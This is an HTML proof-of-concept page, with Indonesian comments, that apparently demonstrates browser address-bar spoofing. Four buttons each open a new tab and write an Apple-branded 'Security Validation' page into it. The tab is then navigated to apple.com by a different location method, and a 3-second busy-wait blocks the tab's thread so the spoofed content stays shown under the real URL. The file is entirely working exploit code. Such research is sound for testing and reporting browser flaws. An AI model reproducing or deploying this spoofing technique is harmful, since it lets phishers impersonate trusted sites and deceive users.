<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Navigation Method Variant PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #111;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
      }
      .container {
        display: flex;
        flex-direction: column;
        gap: 15px;
        width: 90%;
        max-width: 420px;
      }
      button {
        padding: 16px 20px;
        font-size: 16px;
        font-weight: bold;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      }
      .btn-replace { background: #007aff; }
      .btn-assign { background: #34c759; }
      .btn-self { background: #ff9500; }
      .btn-location { background: #af52de; }
    </style>
  </head>
  <body>

    <div class="container">
      <h2 style="text-align:center; font-size:18px; margin-bottom:10px;">Variasi Metode Navigasi Tab Baru</h2>
      
      <!-- 1. Menggunakan location.replace() -->
      <button class="btn-replace" id="btnReplace">1. location.replace()</button>

      <!-- 2. Menggunakan location.assign() -->
      <button class="btn-assign" id="btnAssign">2. location.assign()</button>

      <!-- 3. Menggunakan properti self / top assignment -->
      <button class="btn-self" id="btnSelf">3. self.location / top.location</button>

      <!-- 4. Penugasan langsung objek location -->
      <button class="btn-location" id="btnLocationObj">4. window.location = URL</button>
    </div>

    <script>
      const payloadHTML = `
        <!DOCTYPE html>
        <html>
        <head><title>Apple - Security Test</title></head>
        <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
          <div>
            <h1 style="font-size:36px;color:#1d1d1f;margin-bottom:10px;"> Security Validation</h1>
            <p style="font-size:16px;color:#86868b;">Menguji variasi metode navigasi asinkron.</p>
          </div>
        </body>
        </html>
      `;

      // Fungsi generik untuk mengeksekusi tab baru + beban thread CPU
      function runTest(navigationCallback) {
        const newTab = window.open("about:blank", "_blank");

        if (newTab) {
          newTab.document.write(payloadHTML);
          newTab.document.close();

          // Pemicu navigasi dengan metode spesifik
          setTimeout(() => {
            try {
              navigationCallback(newTab);
            } catch (e) {
              console.error("Navigation error:", e);
            }
          }, 5);

          // Beban CPU sinkron (Busy-Wait) untuk menguji respons thread utama
          setTimeout(() => {
            try {
              const start = Date.now();
              while (Date.now() - start < 3000) {
                newTab.Math.random();
              }
            } catch (e) {
              console.error("Thread block error:", e);
            }
          }, 40);
        }
      }

      // 1. location.replace()
      document.getElementById("btnReplace").onclick = function () {
        runTest((win) => {
          win.location.replace("https://apple.com");
        });
      };

      // 2. location.assign()
      document.getElementById("btnAssign").onclick = function () {
        runTest((win) => {
          win.location.assign("https://apple.com");
        });
      };

      // 3. self.location / top.location
      document.getElementById("btnSelf").onclick = function () {
        runTest((win) => {
          win.self.location = "https://apple.com";
        });
      };

      // 4. Penugasan langsung window.location
      document.getElementById("btnLocationObj").onclick = function () {
        runTest((win) => {
          win.window.location = "https://apple.com";
        });
      };
    </script>
  </body>
</html>
